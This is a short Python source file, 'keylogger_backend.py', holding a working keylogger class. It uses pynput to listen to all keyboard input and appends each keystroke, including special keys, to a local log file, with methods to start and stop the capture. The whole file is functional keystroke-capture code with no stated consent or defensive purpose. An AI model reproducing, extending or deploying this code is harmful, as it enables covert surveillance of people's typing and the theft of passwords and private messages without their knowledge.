# keylogger_backend.py
from pynput import keyboard
import threading

class KeyLogger:
    def __init__(self, log_file="log.txt"):
        self.log_file = log_file
        self.listener = None
        self.is_running = False

    def _on_press(self, key):
        try:
            with open(self.log_file, "a") as f:
                f.write(key.char)
        except AttributeError:
            with open(self.log_file, "a") as f:
                f.write(f"[{key}]")

    def start(self):
        if not self.is_running:
            self.listener = keyboard.Listener(on_press=self._on_press)
            self.listener.start()
            self.is_running = True

    def stop(self):
        if self.listener:
            self.listener.stop()
            self.listener = None
            self.is_running = False

    
